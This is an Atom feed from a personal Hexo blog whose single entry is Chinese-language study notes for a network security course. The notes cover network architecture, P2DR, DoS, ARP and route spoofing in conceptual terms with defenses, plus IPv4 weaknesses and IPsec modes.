<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>stdlibh的个人网站</title>
  
  <subtitle>但行好事，莫问前程</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-06-30T09:40:01.981Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Sanli Ma</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>网络安全大纲下总结</title>
    <link href="http://example.com/2024/06/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E7%BA%B2%E4%B8%8B%E6%80%BB%E7%BB%931/"/>
    <id>http://example.com/2024/06/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E7%BA%B2%E4%B8%8B%E6%80%BB%E7%BB%931/</id>
    <published>2024-06-29T17:23:14.000Z</published>
    <updated>2024-06-30T09:40:01.981Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /># 一、    计算机网络概述<h2 id="1-1-计算机网络结构和组成，典型的网络体系结构；网络协议及封装协议；"><a href="#1-1-计算机网络结构和组成，典型的网络体系结构；网络协议及封装协议；" class="headerlink" title="1.1 计算机网络结构和组成，典型的网络体系结构；网络协议及封装协议；"></a>1.1 计算机网络结构和组成，典型的网络体系结构；网络协议及封装协议；</h2><h3 id="1-1-1计算机网络结构和组成"><a href="#1-1-1计算机网络结构和组成" class="headerlink" title="1.1.1计算机网络结构和组成"></a>1.1.1计算机网络结构和组成</h3><h3 id="1-1-2-典型的网络体系结构"><a href="#1-1-2-典型的网络体系结构" class="headerlink" title="1.1.2 典型的网络体系结构"></a>1.1.2 典型的网络体系结构</h3><p><strong>OSI(（Open System Interconnect）)体系结构参考模型</strong></p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240625162038825.png" alt="image-20240625162038825"></p><p><strong>TCP&#x2F;IP体系结构</strong></p><p>TCP&#x2F;IP是一个四层的体系结构；<br>网际层是为了解决不同网络的互连问题；<br>网络接口层没有具体内容。</p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240629222827090.png" alt="image-20240629222827090"></p><p><strong>计算机网络体系结构</strong></p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240629222905917.png" alt="image-20240629222905917"></p><h3 id="1-1-3-网络协议和封装协议"><a href="#1-1-3-网络协议和封装协议" class="headerlink" title="1.1.3 网络协议和封装协议"></a>1.1.3 网络协议和封装协议</h3><p>一个网络协议主要由以下三个要素组成：<br>语法，<strong>即数据与协议控制信息的结构或格式</strong>。其中数据是服务用户要求传输的信息；协议控制信息俗称首部，是控制协议操作的信息。例如，图1-5和图1-6分别给出了以太网MAC帧的语法格式和IP数据报的语法格式。</p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240629223011011.png" alt="image-20240629223011011"></p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240629223014551.png" alt="image-20240629223014551"></p><p><strong>层与层交换数据的封装过程：</strong></p><p><strong>TCP&#x2F;IP协议的封装关系</strong></p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240629223045655.png" alt="image-20240629223045655"></p><h3 id="1-1-4-网络协议及协议封装"><a href="#1-1-4-网络协议及协议封装" class="headerlink" title="1.1.4 网络协议及协议封装"></a>1.1.4 网络协议及协议封装</h3><p>在计算机网络中，每层都有各自的<strong>传送数据单位</strong>，这个数据单位因为是协议之间交换的，故称作协议数据单元。<br>N层的协议数据单元记作（N）协议数据单元。<br><strong>应用层</strong>的协议数据单元称作用户数据或用户信息；<br><strong>传输层</strong>的协议数据单元称作数据段（segment），也称作报文（message）；<br><strong>网络层</strong>的协议数据单元称作分组或包（packet）；<br><strong>数据链</strong>路层的协议数据单元称作帧（frame）；<br><strong>物理层</strong>协议数据单元称作位（bit）。</p><h2 id="1-2-信息安全定义，主要安全特性"><a href="#1-2-信息安全定义，主要安全特性" class="headerlink" title="1.2 信息安全定义，主要安全特性"></a>1.2 信息安全定义，主要安全特性</h2><h3 id="1-2-1-信息安全定义"><a href="#1-2-1-信息安全定义" class="headerlink" title="1.2.1 信息安全定义"></a>1.2.1 信息安全定义</h3><p>【名词解释】信息安全定义：<strong>安全是指不受威胁，没有危险、危害和损失。因此，信息安全是指信息系统中的信息不会因为偶然的，或者恶意的原因而遭受破坏、更改和泄露，信息系统能够持续、不间断地提供信息服务。</strong></p><h3 id="1-2-2-主要安全特性"><a href="#1-2-2-主要安全特性" class="headerlink" title="1.2.2 主要安全特性"></a>1.2.2 主要安全特性</h3><p><strong>可用性</strong>：是信息被授权实体访问并按需使用的特性。<br><strong>保密性</strong>：是防止信息泄露给非授权个人或实体，只为授权用户使用的特性。<br><strong>完整性</strong>：是信息未经授权不能改变的特性。<br><strong>不可抵赖性</strong>：是信息交互过程中，所有参与者不能否认曾经完成的操作或承诺的特性 。<br><strong>可控制性</strong>：是对信息的传播过程及内容具有控制能力的特性。</p><h2 id="1-3-网络安全模型，计算机网络的脆弱性"><a href="#1-3-网络安全模型，计算机网络的脆弱性" class="headerlink" title="1.3 网络安全模型，计算机网络的脆弱性"></a>1.3 网络安全模型，计算机网络的脆弱性</h2><h3 id="1-3-1网络安全模型"><a href="#1-3-1网络安全模型" class="headerlink" title="1.3.1网络安全模型"></a>1.3.1网络安全模型</h3><h4 id="安全模型含义"><a href="#安全模型含义" class="headerlink" title="安全模型含义"></a>安全模型含义</h4><p>​      <strong>安全模型以建模的方式给出解决安全问题的方法和过程</strong>。<strong>精确地描述信息系统行为与保障信息系统安全所涉及的要素之间的相互关系。</strong></p><h4 id="P2DR安全模型"><a href="#P2DR安全模型" class="headerlink" title="P2DR安全模型"></a>P2DR安全模型</h4><h5 id="P2DR安全模型组成："><a href="#P2DR安全模型组成：" class="headerlink" title="P2DR安全模型组成："></a>P2DR安全模型组成：</h5><p>策略：为实现信息系统的安全目标，对所有与信息系统安全相关的活动所制订的规则。<br>防护：信息系统的安全保护措施，由安全技术实现。<br>检测：了解和评估信息系统的安全状态，发现信息系统异常行为的机制。<br>响应：发现信息系统异常行为后采取的行动。</p><p>定义以下时间参数</p><p>Pt：信息系统采取安全保护措施后的防护时间，也是入侵者完成入侵过程需要的时间。<br>Dt：从入侵者开始入侵到检测工具检测到入侵行为所需要的时间。<br>Rt：从检测工具发现入侵行为，到信息系统通过适当的反应，重新将信息系统调整到正常状态所需要的时间。</p><p>如果某个信息系统的时间参数满足以下不等式：<br>Pt＞Dt＋Rt<br>表明该信息系统是安全的信息系统。<br>如果某个信息系统的时间参数满足以下不等式：<br>Pt＜Dt＋Rt<br>表明该信息系统是不安全的信息系统。<br>如果Et为暴露时间。<br>Et＝Dt＋Rt－Pt。</p><h3 id="1-3-2计算机网络的脆弱性"><a href="#1-3-2计算机网络的脆弱性" class="headerlink" title="1.3.2计算机网络的脆弱性"></a>1.3.2计算机网络的脆弱性</h3><h4 id="1-分组交换容易受到攻击"><a href="#1-分组交换容易受到攻击" class="headerlink" title="1. 分组交换容易受到攻击"></a>1. 分组交换容易受到攻击</h4><p>因特网是基于分组交换的，这使得它比采用电路交换的电信网更容易受攻击，主要表现在：</p><ul><li>所有用户共享所有资源，给予一个用户的服务会受到其他用户的影响；</li><li>攻击数据包在被判断为是否恶意之前都会被转发到受害者；</li><li>路由分散决策，流量无序等。</li></ul><h4 id="2-缺乏认证与可追踪性"><a href="#2-缺乏认证与可追踪性" class="headerlink" title="2 .缺乏认证与可追踪性"></a>2 .缺乏认证与可追踪性</h4><p>因特网没有认证机制，任何一个终端接入即可访问全网（而电信网则不是，有UNI、NNI接口之分），这导致了一个严重的问题就是IP欺骗：<br>攻击者可以伪造数据包中的任何区域的内容然后发送数据包到Internet中。<strong>通常情况下，路由器不具备数据追踪功能，因此很难去验证一个数据包是否来自其所声称的地方。</strong><br>通过IP欺骗隐藏来源，攻击者就可以发起攻击而无须担心对由此造成的损失负责。</p><h4 id="3-尽力而为（best-effort）的服务策略"><a href="#3-尽力而为（best-effort）的服务策略" class="headerlink" title="3. 尽力而为（best-effort）的服务策略"></a>3. 尽力而为（best-effort）的服务策略</h4><p>因特网采取的是尽力而为策略，即只要是交给网络的数据，不管其是正常用户发送的正常数据，还是攻击者发送的攻击流量，网络都会尽可能地将其送到目的地。把网络资源的分配和公平性完全寄托在终端的自律上，在现在看来，这显然是不现实的。</p><h4 id="4．匿名与隐私"><a href="#4．匿名与隐私" class="headerlink" title="4．匿名与隐私"></a>4．匿名与隐私</h4><p>网络上的身份是虚拟的，普通用户无法知道对方的真实身份，也无法拒绝来路不明的信息（如邮件）。</p><h4 id="5．对全球网络基础实施的依赖"><a href="#5．对全球网络基础实施的依赖" class="headerlink" title="5．对全球网络基础实施的依赖"></a>5．对全球网络基础实施的依赖</h4><p>全球网络基础设施不提供可靠性、安全性保证，这使得攻击者可以放大其攻击效力：<br>首先，一些不恰当的协议设计导致一些（尤其是畸形的）数据包比其他数据包耗费更多的资源（如TCP 协议的连接请求SYN包比其他的TCP包占用的目标资源更多）；<br>其次，Internet是一个大“集体”，其中存在的很多不安全系统会严重威胁整个网络的安全。</p><h4 id="6．无尺度网络"><a href="#6．无尺度网络" class="headerlink" title="6．无尺度网络"></a>6．无尺度网络</h4><p>全球网络基础设施不提供可靠性、安全性保证，这使得攻击者可以放大其攻击效力：<br>因特网是一种无尺度网络。<br><strong>无尺度网络的典型特征是网络中的大部分节点只和很少节点连接，而有极少数节点与非常多的节点连接。</strong><br>这种关键节点（称为“枢纽”或“集散节点”）的存在使得无尺度网络对意外故障有强大的承受能力（删除大部分网络节点而不会引发网络分裂），但面对针对枢纽节点的协同性攻击时则显得脆弱</p><h4 id="7．互联网的级联特性"><a href="#7．互联网的级联特性" class="headerlink" title="7．互联网的级联特性"></a>7．互联网的级联特性</h4><p>互联网是一个由路由器将众多小的网络级联而成的大网络。当网络中的一条通信线路发生变化时，附近的路由器会通过“<strong>边界网关协议（BGP）</strong>”向其邻近的路由器发出通知。这些路由器接着又向其他邻近路由器发出通知，最后将新路径的情况发布到整个互联网。<br>“<strong>网络数字大炮</strong>”就是针对互联网的这种级联结构发起的一种拒绝服务攻击武器，利用伪造的BGP协议消息攻击路由器，导致网络中几乎所有路由器都被占用，正常的路由中断无法得到修复，最终可导致互联网大面积瘫痪。</p><h4 id="8．中间盒子带来新的安全风险"><a href="#8．中间盒子带来新的安全风险" class="headerlink" title="8．中间盒子带来新的安全风险"></a>8．中间盒子带来新的安全风险</h4><p>例如：用于改善性能的DNS 缓存（cache）、HTTP代理／缓存、CDN等，用于协议转换的NAT（Network Address Translation）、IPv4-IPv6转换器等，用于安全防护的防火墙、入侵检测系统／入侵防御系统（IDS&#x2F;IPS）等不同类型的中间盒子大量被插入互联网之中<br>在网络中引入了单一故障点和新的网络攻击点，削弱了网络的健壮性和安全性。同时，大量不同厂家实现的中间盒子对同一协议的理解和实现的不一致性也给网络带来了新的安全风险。</p><h1 id="二、-网络攻击"><a href="#二、-网络攻击" class="headerlink" title="二、 网络攻击"></a>二、 网络攻击</h1><h2 id="2-1主要的定义及分类"><a href="#2-1主要的定义及分类" class="headerlink" title="2.1主要的定义及分类"></a>2.1主要的定义及分类</h2><h3 id="2-1-1定义"><a href="#2-1-1定义" class="headerlink" title="2.1.1定义"></a>2.1.1定义</h3><p>【名词解释】<strong>网络安全威胁</strong>是指网络环境下的信息系统中分布在主机、链路和转发节点中的信息受到威胁，存在危险，遭受损失，信息系统<strong>无法持续正常提供服务</strong>。</p><p>【名词解释】网络攻击是指利用网络存在的漏洞和安全缺陷对网络中的硬件、软件及信息进行的攻击，其目的是破坏网络中信息的保密性、完整性、可用性、可控制性和不可抵赖性<strong>等安全特性</strong>，削弱、甚至瘫痪网络的服务功能。</p><h3 id="2-1-2-分类"><a href="#2-1-2-分类" class="headerlink" title="2.1.2 分类"></a>2.1.2 分类</h3><p>可以分为<strong>主动攻击</strong>和<strong>被动攻击</strong>。被动攻击由于对网络和主机都是透明的，因此难以检测，防御被动攻击的主要方法是防患于未然。</p><p><strong>主动攻击</strong>：是指会<strong>改变网络中的信息、状态和信息流模式的攻击行为</strong>，并且可以<strong>破坏信息的保密性、完整性和可用性。</strong><br><strong>被动攻击</strong>：是指<strong>不会</strong>对经过网络传输的信息、网络状态和网络信息流模式产生影响的攻击行为，<strong>一般只破坏信息的保密性。</strong></p><p>以下网络攻击属于主动攻击<br><strong>篡改信息</strong>：篡改信息是指截获经过网络传输的信息，并对信息进行篡改；或者对存储在主机中的信息进行篡改的攻击行为。<br><strong>欺骗攻击</strong>：欺骗攻击是一种用错误的信息误导网络数据传输过程和用户资源访问过程的攻击行为。源IP地址欺骗攻击是用伪造的IP地址作为用以发动攻击的IP分组的源IP地址。域名系统（DNS）欺骗攻击是将伪造的IP地址作为域名解析结果，返回给用户。路由项欺骗攻击是用伪造的路由项来改变路由器中路由表的内容。<br><strong>拒绝服务攻击</strong>：拒绝服务攻击是通过消耗链路带宽、转发节点处理能力和主机计算能力使网络丧失服务功能的攻击行为。<br><strong>重放攻击</strong>：截获经过网络传输的信息，延迟一段时间后，再转发该信息，或者延迟一段时间后，反复多次转发该信息的攻击行为。</p><p>以下网络攻击属于被动攻击<br><strong>嗅探信息</strong>（大部分）：复制经过网络传输的信息，但不会改变信息和信息传输过程。<br><strong>非法访问</strong>：读取主机存储的信息，但不对信息做任何改变。<br><strong>数据流分析</strong>：对经过网络传输的数据流进行统计，并通过分析统计结果，得出网络中的信息传输模式。如通过记录每一个IP分组的源和目的IP地址及IP分组的净荷字段长度，可以得出每一对终端之间传输的数据量，并因此推导出终端之间的流量分布。</p><h2 id="2-2嗅探攻击，定义及原理"><a href="#2-2嗅探攻击，定义及原理" class="headerlink" title="2.2嗅探攻击，定义及原理"></a>2.2嗅探攻击，定义及原理</h2><h4 id="【名词解释】嗅探攻击定义"><a href="#【名词解释】嗅探攻击定义" class="headerlink" title="【名词解释】嗅探攻击定义"></a>【名词解释】嗅探攻击定义</h4><p>嗅探攻击是指攻击者使用网络嗅探工具（如Wireshark、Tcpdump等）监视网络数据包，以<strong>窃取和分析网络中的敏感信息</strong>。攻击者可以通过连接到受害者所在的网络或使用恶意软件在受害者设备上进行数据包捕获。</p><h4 id="【名词解释】嗅探攻击原理"><a href="#【名词解释】嗅探攻击原理" class="headerlink" title="【名词解释】嗅探攻击原理"></a>【名词解释】嗅探攻击原理</h4><p><strong>嗅探攻击是被动攻击，主要是黑客终端通过接入嗅探目标终端的信息传输路径，然后复制经过网络传输的信息</strong></p><p>终端A向终端B传输信息过程中，信息不仅沿着终端A至终端B的传输路径传输，<strong>还沿着终端A至黑客终端的传输路径传输</strong>，终端A至黑客终端的传输路径对终端A和终端B都是<strong>透明</strong>的。</p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240630004955597.png" alt="image-20240630004955597"></p><h2 id="2-3！-拒绝服务攻击原理-防御机制"><a href="#2-3！-拒绝服务攻击原理-防御机制" class="headerlink" title="2.3！**&#x3D;&#x3D;拒绝服务攻击原理&#x2F;防御机制&#x3D;&#x3D;**"></a>2.3！**&#x3D;&#x3D;拒绝服务攻击原理&#x2F;防御机制&#x3D;&#x3D;**</h2><h3 id="2-3-1-拒绝服务攻击原理"><a href="#2-3-1-拒绝服务攻击原理" class="headerlink" title="2.3.1 拒绝服务攻击原理"></a>2.3.1 拒绝服务攻击原理</h3><h4 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. 基本概念</h4><ul><li><strong>拒绝服务(DoS)攻击</strong>：通过某种手段，有意造成计算机或网络不能正常运转，从而不能向合法用户提供服务或降低服务质量。</li><li><strong>分布式拒绝服务(DDoS)攻击</strong>：多个攻击者或被控制的主机向同一目标发起攻击。</li></ul><h4 id="2-攻击分类"><a href="#2-攻击分类" class="headerlink" title="2. 攻击分类"></a>2. 攻击分类</h4><ul><li><strong>按攻击方式</strong>：资源破坏型、物理破坏型、服务终止型</li><li><strong>按攻击目标</strong>：直接型、间接型  </li><li><strong>按攻击机制</strong>：剧毒包型、风暴型、重定向型</li></ul><h4 id="3-主要攻击原理"><a href="#3-主要攻击原理" class="headerlink" title="3. 主要攻击原理"></a>3. 主要攻击原理</h4><h4 id="1-剧毒包型攻击"><a href="#1-剧毒包型攻击" class="headerlink" title="(1) 剧毒包型攻击"></a>(1) 剧毒包型攻击</h4><ul><li>利用协议或软件漏洞，发送异常数据包使目标系统崩溃</li><li>例如：WinNuke攻击、Land攻击、Ping of Death攻击等</li></ul><h4 id="2-风暴型攻击"><a href="#2-风暴型攻击" class="headerlink" title="(2) 风暴型攻击"></a>(2) 风暴型攻击</h4><ul><li><p>向目标发送大量数据包，耗尽系统资源</p></li><li><p>例如：SYN Flood、ICMP Flood、UDP Flood、HTTP Flood等</p><ul><li><p><strong>对付风暴型DDoS攻击的方案主要有四种</strong>：</p><p>1.通过丢弃恶意分组的方法保护网络；</p><p>2.在源端控制DDoS攻击；</p><p>3.追溯 (Traceback) 攻击的源端, 然后阻止它发起新的攻击；</p><p>4.路由器动态检测流量并进行控制。</p><p><strong>最有效的对抗风暴型DDoS的方法是：&#x3D;&#x3D;流量清洗&#x3D;&#x3D;</strong></p></li></ul></li></ul><h4 id="3-反射型攻击"><a href="#3-反射型攻击" class="headerlink" title="(3) 反射型攻击"></a>(3) 反射型攻击</h4><ul><li>利用中间服务器(反射器)向目标发送大量响应包</li><li>例如：NTP反射攻击、DNS放大攻击等</li></ul><h3 id="2-3-2-防御机制"><a href="#2-3-2-防御机制" class="headerlink" title="2.3.2 防御机制"></a>2.3.2 防御机制</h3><p>从原理上讲，主要有四种应对DoS攻击的方法</p><ul><li><strong>分组过滤</strong>：通过丢弃恶意分组的方法保护受攻击的网络或系统</li><li><strong>源端控制</strong>：在源端控制DoS攻击</li><li><strong>追溯</strong>：追湖(traceback)发起攻击的源端，然后阻止它发起新的攻击</li><li><strong>路由器动态检测和控制</strong>：在路由器上动态检测和控制DoS攻击引起的拥塞</li></ul><p><strong>&#x3D;&#x3D;拒绝服务攻击是最容易实现，却最难防护的攻击手段&#x3D;&#x3D;</strong></p><h2 id="2-4-截获攻击，Mac地址欺骗攻击；Arp欺骗攻击"><a href="#2-4-截获攻击，Mac地址欺骗攻击；Arp欺骗攻击" class="headerlink" title="2.4   截获攻击，Mac地址欺骗攻击；Arp欺骗攻击"></a>2.4   截获攻击，Mac地址欺骗攻击；Arp欺骗攻击</h2><ol><li><h3 id="截获攻击的原理"><a href="#截获攻击的原理" class="headerlink" title="截获攻击的原理:"></a>截获攻击的原理:</h3></li></ol><ul><li>攻击者改变信息传输路径,使数据经过攻击者的设备。</li><li>攻击者截获信息后可以篡改、延迟转发或重复转发信息。</li><li>属于主动攻击。</li></ul><ol start="2"><li><h3 id="MAC地址欺骗攻击"><a href="#MAC地址欺骗攻击" class="headerlink" title="MAC地址欺骗攻击:"></a>MAC地址欺骗攻击:</h3></li></ol><ul><li><p>攻击者伪造MAC地址,使自己的MAC地址与目标IP绑定。</p></li><li><p>导致其他设备将数据错误地发送给攻击者而非目标设备。</p></li><li><p>利用了设备无法验证ARP报文中IP和MAC绑定的真实性。</p><p>MAC 地址欺骗攻击：</p><ul><li>黑客终端将自己的 MAC 地址修改为终端 A 的 MAC 地址，发送以 MAC A 为源 MAC 地址、以广播地址为目的 MAC 地址的 MAC 帧，使得以太网中各个交换机的转发表中 MAC 地址为 MAC A 的转发项将通过黑客终端的交换路径作为目的 MAC 地址为 MAC A 的 MAC 帧的传输路径。</li><li>防御机制：<strong>阻止黑客终端接入以太网，阻止黑客终端发送的以伪造的 MAC 地址为源 MAC 地址的 MAC 帧进入以太网。</strong></li></ul><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240625180117441.png" alt="image-20240625180117441"></p></li></ul><ol start="3"><li><h3 id="ARP欺骗攻击"><a href="#ARP欺骗攻击" class="headerlink" title="ARP欺骗攻击:"></a>ARP欺骗攻击:</h3></li></ol><p>攻击者发送伪造的ARP报文,使其他设备错误更新ARP缓存。导致数据被错误地发送到攻击者而非真正的目标。通常会先攻击使目标设备瘫痪,以稳妥地截获数据。</p><ul><li><p>ARP 欺骗攻击原理：<strong>以太网中终端无法鉴别 ARP 请求报文中给出的 IP 地址与 MAC 地址绑定项的真伪</strong>。</p></li><li><p>ARP 欺骗攻击过程：黑客终端在发送的 ARP 请求报文中给出 IP 地址 IP B 和 MAC 地址 MAC A 的绑定项，其他终端在 ARP 缓冲区中记录 IP B 与 MAC A 的绑定项，如果需要向 IP 地址为 IP B 的结点传输 IP 分组，该 IP 分组被封装成以 MAC A 为目的 MAC 地址的 MAC 帧，该 MAC 帧经过以太网传输后，到达终端 A，而不是到达终端 B。</p></li><li><p>防御机制：**&#x3D;&#x3D;以太网交换机提供鉴别 ARP 请求和响应报文中 IP 地址与 MAC 地址绑定项真伪的功能。&#x3D;&#x3D;**</p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240630143911941.png" alt="image-20240630143911941"></p></li></ul><h2 id="2-5！-路由欺骗攻击，原理及过程"><a href="#2-5！-路由欺骗攻击，原理及过程" class="headerlink" title="2.5！ &#x3D;&#x3D;路由欺骗攻击，原理及过程&#x3D;&#x3D;"></a>2.5！ &#x3D;&#x3D;<strong>路由欺骗攻击，</strong>原理及过程&#x3D;&#x3D;</h2><ol><li><strong>原理:</strong></li></ol><ul><li><p>攻击者向路由器发送伪造的路由项信息。</p></li><li><p>使路由器更新错误的路由表。</p></li><li><p>导致数据被错误地转发到攻击者。</p><p><strong>黑客终端向路由器 R1 发送一项伪造的路由项，该伪造的路由项将通往网络 W 的距离设置为 0</strong>，路由器 R1 接收到该路由项后，选择黑客终端作为通往网络 W 的传输路径的下一跳，并将所有目的网络为网络 W 的 IP 分组转发给黑客终端。</p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240630143935414.png" alt="image-20240630143935414"></p></li></ul><ol start="2"><li>攻击过程:</li></ol><ul><li>攻击者发送伪造的路由消息,声称到某网络距离最短。</li><li>路由器更新路由表,将该网络的下一跳改为攻击者。</li><li>发往该网络的数据被错误地转发给攻击者。</li><li>攻击者可以截获、篡改或转发这些数据。</li></ul><ol start="3"><li>防御机制:</li></ol><ul><li><p>路由器需要验证路由消息的来源。</p></li><li><p>检查路由消息的完整性。</p></li><li><p>只处理经过认证的相邻路由器发送的未被篡改的消息。</p><p><strong>路由器接收到路由消息后，首先需要鉴别路由消息的发送端，并对路由消息进行完整性检测，确定路由消息是由经过认证的相邻路由器发送，且路由消息传输过程中没有被篡改后，才处理该路由消息，并根据处理结果更新路由表。</strong></p></li></ul><h1 id="三、-IP与路由安全"><a href="#三、-IP与路由安全" class="headerlink" title="三、    IP与路由安全"></a>三、    IP与路由安全</h1><h2 id="3-1-IPv4协议，主要的安全问题"><a href="#3-1-IPv4协议，主要的安全问题" class="headerlink" title="3.1&#x3D;&#x3D;! IPv4协议，主要的安全问题&#x3D;&#x3D;"></a>3.1&#x3D;&#x3D;! <strong>IPv4</strong>协议，主要的安全问题&#x3D;&#x3D;</h2><h4 id="3-1-1-IPv4协议"><a href="#3-1-1-IPv4协议" class="headerlink" title="3.1.1.IPv4协议"></a>3.1.1.<strong>IPv4</strong>协议</h4><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240629230037049.png" alt="image-20240629230037049"></p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240629230051585.png" alt="image-20240629230051585"></p><h4 id="3-1-2-主要的安全问题"><a href="#3-1-2-主要的安全问题" class="headerlink" title="3.1.2 主要的安全问题"></a>3.1.2 主要的安全问题</h4><h5 id="IPv4协议没有认证机制："><a href="#IPv4协议没有认证机制：" class="headerlink" title="IPv4协议没有认证机制："></a>IPv4协议没有认证机制：</h5><p>没有消息源认证：源地址假冒<br>没有完整性认证：篡改</p><h5 id="IPv4没有加密机制"><a href="#IPv4没有加密机制" class="headerlink" title="IPv4没有加密机制"></a>IPv4没有加密机制</h5><p>无机密性：监听应用数据<br>泄露拓扑等信息：网络侦察</p><h5 id="无带宽控制："><a href="#无带宽控制：" class="headerlink" title="无带宽控制："></a>无带宽控制：</h5><p>DDoS攻击</p><h2 id="3-2-IPSec安全策略，运行模式"><a href="#3-2-IPSec安全策略，运行模式" class="headerlink" title="3.2&#x3D;&#x3D;! IPSec安全策略，运行模式&#x3D;&#x3D;"></a>3.2&#x3D;&#x3D;! <strong>IPSec</strong>安全策略，运行模式&#x3D;&#x3D;</h2><h3 id="3-2-1-IPSec安全策略"><a href="#3-2-1-IPSec安全策略" class="headerlink" title="3.2.1 IPSec安全策略"></a>3.2.1 <strong>IPSec</strong>安全策略</h3><p>IPsec操作的基础是应用于每一个<strong>从源端到目的端</strong>传输的IP包上的安全策略。<br>IPsec安全策略主要由两个交互的数据库:<br>安全关联数据库（Security Association Database, SAD）<br>安全策略数据库（Security Policy Database, SPD)</p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240629230237379.png" alt="image-20240629230237379"></p><h4 id="安全关联SA"><a href="#安全关联SA" class="headerlink" title="安全关联SA"></a>安全关联SA</h4><p>IPsec 安全关联 (security association, SA) 指定<strong>由通信主机识别的安全属性</strong>。单个 SA 保护单一方向的数据，此保护针对单个主机或一组（多点传送）地址。</p><p>安全关联（Security Association, SA）<br>一个SA：发送端和接收端之间的<strong>单向</strong>逻辑连接，<strong>为数据流提供安全服务</strong>；经过同一SA的数据流会得到相同的安全服务，如AH或ESP<br>SA对：<strong>双向</strong>安全数据交换<br>同时支持AH、ESP且双向：需两对SA</p><p>一个SA由以下参数确定<br><strong>安全参数索引</strong>（Security Parameters Index, SPI）：32位，接收方根据SPI选择合适的SA处理接收到的数据包<br><strong>IP目的地址</strong>：仅允许单播地址<br><strong>安全协议标识</strong>（Security Protocol Identifier）：AH &#x2F; ESP</p><p><strong>IPsec协议模式</strong>：隧道、传输或通配符</p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240629230529740.png" alt="image-20240629230529740"></p><p>不同SA可以用<strong>多种方式组合</strong>以获得理想的用户配置。此外，IPsec对需要IPsec保护的流量和不需要IPsec保护的流量提供<strong>多种粒度的控制</strong></p><h4 id="安全策略SP"><a href="#安全策略SP" class="headerlink" title="安全策略SP"></a>安全策略SP</h4><p>安全策略（Security Policy, SP）<br>指定对IP数据包提供何种保护，并以何种方式实施保护<br>主要根据源IP、目的IP、入数据还是出数据等来标识<br>用户设定自己的安全策略的粒度：IP地址，传输层协议，TCP&#x2F;UDP端口号<br><strong>操作：Discard、Bypass、Protect</strong></p><p>SPD中的每一条SP包括：<br>本地IP<br>远程IP<br>下一层协议<br>名称<br>本地或远程端口</p><h3 id="3-2-2-运行模式"><a href="#3-2-2-运行模式" class="headerlink" title="3.2.2 运行模式"></a>3.2.2 运行模式</h3><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240629230728681.png" alt="image-20240629230728681"></p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240629230754220.png" alt="image-20240629230754220"></p><p>IPSec传输模式用于端到端通信，例如，用于客户端与服务器之间或工作站与网关之间的通信（如果网关被视为主机）。一个很好的例子是从工作站到服务器的加密Telnet或远程桌面会话<br>传输模式通过AH或ESP头提供对我们数据的保护，也称为IP有效负载，由TCP &#x2F; UDP头+数据组成。有效负载由IPSec头和尾封装。原始IP标头保持不变，只是IP协议字段更改为ESP（50）或AH（51），并且原始协议值保存在IPsec尾部中，以便在解密数据包时进行恢复。<br>通常在以下情况下使用IPSec传输模式：使用另一个隧道协议（如GRE）首先封装IP数据包，然后使用IPSec保护GRE隧道包。IPSec在传输模式下保护GRE隧道流量。</p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240629230810870.png" alt="image-20240629230810870"></p><p>IPSec隧道模式是默认模式。在隧道模式下，整个原始IP数据包均受IPSec保护。这意味着IPSec包装原始数据包，对其进行加密，添加新的IP标头并将其发送到VPN隧道的另一端（IPSec对等方）。<br>隧道模式最常用于网关之间（Cisco路由器或ASA防火墙），或在网关的终端站，网关充当其后的主机的代理。<br>隧道模式用于加密安全IPSec网关（例如，通过IPSec VPN通过Internet连接的两个Cisco路由器）之间的通信。我们的站点到站点IPSec VPN文章中广泛介绍了此拓扑的配置和设置。在此示例中，每个路由器都充当其LAN的IPSec网关，提供到远程网络的安全连接：<br>隧道模式的另一个示例是Cisco VPN客户端和IPSec网关（例如ASA5510或PIX防火墙）之间的IPSec隧道。客户端连接到IPSec网关。来自客户端的流量经过加密，封装在新的IP数据包中，然后发送到另一端。一旦由防火墙设备解密，客户端的原始IP数据包将发送到本地网络。<br>在隧道模式下，IPSec头（AH或ESP头）插入IP头和上层协议之间。在AH和ESP之间，ESP最常用于IPSec VPN隧道配置中。</p><h2 id="3-3IPv6地址及端口（找不到）"><a href="#3-3IPv6地址及端口（找不到）" class="headerlink" title="3.3IPv6地址及端口（找不到）"></a>3.3IPv6地址及端口（找不到）</h2><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240629230938426.png" alt="image-20240629230938426"></p><h4 id="IPv6地址"><a href="#IPv6地址" class="headerlink" 